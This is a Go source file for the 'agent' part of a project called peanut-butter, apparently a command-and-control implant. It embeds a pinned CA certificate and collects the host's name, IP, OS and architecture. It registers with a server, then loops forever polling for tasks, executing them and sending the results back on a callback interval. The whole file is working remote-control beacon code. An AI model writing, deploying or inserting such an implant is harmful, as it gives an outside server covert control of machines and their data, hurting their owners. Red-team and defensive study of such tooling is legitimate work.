// The agent which executes commands and sends results back to the server
package agent

import (
	"crypto/tls"
	"crypto/x509"
	"errors"
	"log"
	"net/http"
	"os"
	"runtime"
	"time"

	"github.com/MeHungr/peanut-butter/internal/api"
	"github.com/MeHungr/peanut-butter/internal/pberrors"
	agenttransport "github.com/MeHungr/peanut-butter/internal/transport/agent"
)

// CACertPEM is the certificate from the CA used by the server
var CACertPEM = []byte(`
-----BEGIN CERTIFICATE-----
MIIFAzCCAuugAwIBAgIUfseV05MUFE2ZH+502NNDsfmH60MwDQYJKoZIhvcNAQEL
BQAwETEPMA0GA1UEAwwGUE5VVEJSMB4XDTI1MTEwMTA1Mzc1NFoXDTM1MTAzMDA1
Mzc1NFowETEPMA0GA1UEAwwGUE5VVEJSMIICIjANBgkqhkiG9w0BAQEFAAOCAg8A
MIICCgKCAgEAvdq29f1mz+NysJAPYq/KFbRvTTa9zRxHqTxknkQmgzYAA362Ckrm
EgRVPNVUU9sIw7oitvoJkpGDjlcE0UolHj+55MwIa5aFJQoEEcwCoJuxdawa+GxM
rCERqTOG9TUAyf0VBZEbQRjbN3xkS0i/8hxfhf+OPcdsxt4fnfkh3px71fhBscoT
4IzRK/V9nfIxvoBtFQIFJ4qrTiwuJp9mecq9dLevT6MW7DtqN2cfTUdKHOgn7qY5
e7J9uKpG9WcwzKtzEupkAn3m6/XqoDT4BHwaQkxyYG7rESozKjiWE5kOsSxzH+FE
VD0kCVjzOmBgCka0DjomNHBqp3JTs/rTQARCuKttkFXxlp4UySn63Dbs7Dxl3Ir6
r6rKHBIY9fM1/WvUERPsMe+ERLgpk0JBleR0t8aVHqJ+KfHoI9hRxXCMtA4b7gbk
Vd+D0RgPACG1Hj3qx1uvQSPKnz5BGoARmqqbc0urLSZUz/1U17AvlReenSsMfQYG
xuYfTmz8YTmOJf0XuHydQ14LqHWKacyH7R4JnmnzEWov5UBvEjsqh/TfQeFi55Fq
lq30eQ3Tswxqm83nKE+k0UrQwbrR2VyuD+B2qSywGVI0KZ845zlBOg1FrlnjK5HG
Kb3U3ew4oX/q6+WhW8LFB3/Q/nV9B6lwrCe0ESVzpoMa/tZejwQKdzMCAwEAAaNT
MFEwHQYDVR0OBBYEFCbyjE2yrne4RmwOQ9w8LzxEKpodMB8GA1UdIwQYMBaAFCby
jE2yrne4RmwOQ9w8LzxEKpodMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQEL
BQADggIBAFCQmQsABqx8ZKKbOKzUOZnu7yi0i4Z+UiwOe9qVnh/xDZRH2dQVwF6B
ZktphZgcf8nyE8frVhf+VnP9A4sa8e6gOC6fv/ccbHCYO8cOoB2MvyFA9rMuejEI
9gknDF8dujzBdkzg54tNGX1+uPo+Q67sxENRQtvQfsZK+CcggVDWnlc+A5Owe8G2
TMY7/pSRJEqQLeFhtD+S14LDj1rhqlBSpLMBcr7GTjH5+RKxXRQpmOrwoTVPvFjz
lGAfHprwFlWaINUt/eMLyGEAmVZ/hPL6CPCLtIt9GSJicSQBIXItDqFztJiFdCYn
iLgzmYrxpI8kBTcUJ3A6uP+4ApqJDGyaPDwtRPFn2fIBO7sbURXUogADSfuJTRKa
sz38c86LPakE0zxgepP+BYsbpTZDM4NLHKBnPQ5U82F3pfFt/f9Lnw8ygwhj9zM1
aqehifxwCrQ2bSo/hsfMBmUZHjAEWzzGy3JwpqIYKiyoxG/zcGkdRtF0rWQNsCe4
Yqz9rll41DD9VHmVnaX1/5CHuyaI/eLi/IoTXmKnOaWkSdAetvbLKpsbp5H/UNF8
KvM7avVWRWcYWj2JTBkhULLv6V5AlTX/OItd/9Lph1u18UQCrjbaM+0ycMO8RLyh
aq+tZ06L1pnsSRkdq276n94hqSZHRdVCwEy9wvvA37VpWqIfdKMQ
-----END CERTIFICATE-----
`)

// Agent represents the agent
type Agent struct {
	Info  *api.Agent
	Debug bool
	comm  *agenttransport.CommManager
}

// NewHTTPSClient creates a new client for secure HTTPS communication
func NewHTTPSClient() *http.Client {
	pool := x509.NewCertPool()
	pool.AppendCertsFromPEM(CACertPEM)

	tlsConfig := &tls.Config{
		RootCAs:    pool,
		MinVersion: tls.VersionTLS12,
	}

	return &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: tlsConfig,
		},
		Timeout: 10 * time.Second,
	}
}

// New creates a new Agent with sensible defaults.
func New(id, serverIP string, serverPort int, callbackInterval time.Duration, debug bool) *Agent {
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}

	// Initialize transports
	httpsTransport := &agenttransport.HTTPSTransport{Client: NewHTTPSClient()}

	return &Agent{
		Info: &api.Agent{
			AgentID:          id,
			AgentIP:          GetLocalIP(),
			ServerIP:         serverIP,
			ServerPort:       serverPort,
			CallbackInterval: callbackInterval,
			Hostname:         hostname,
			OS:               runtime.GOOS,
			Arch:             runtime.GOARCH,
		},
		Debug: debug,
		comm: &agenttransport.CommManager{
			Transports: map[string]agenttransport.Transport{
				"https": httpsTransport,
			},
			Active: httpsTransport,
		},
	}
}

// Start starts the agent and begins the main polling loop
func (a *Agent) Start() {
	if a.Debug {
		log.Printf("Agent starting with ID: %s\n", a.Info.AgentID)
	}

	// Attempt to register with the server until successful
	a.registerUntilDone()

	// Main polling loop
	for {
		task, err := a.comm.GetTask(a.Info, a.Debug)
		if err != nil {
			if errors.Is(err, pberrors.ErrInvalidAgentID) {
				a.registerUntilDone()
				continue
			}
			if a.Debug {
				log.Println("GetTask error:", err)
			}
			time.Sleep(5 * time.Second)
			continue
		}

		if task != nil {
			result, err := a.ExecuteTask(task)
			if err != nil {
				if a.Debug {
					log.Println("ExecuteTask error:", err)
				}
				continue
			}
			if err := a.comm.SendResult(a.Info, result, a.Debug); err != nil {
				if a.Debug {
					log.Println("SendResult error:", err)
				}
			}
		}

		time.Sleep(a.Info.CallbackInterval)
	}
}
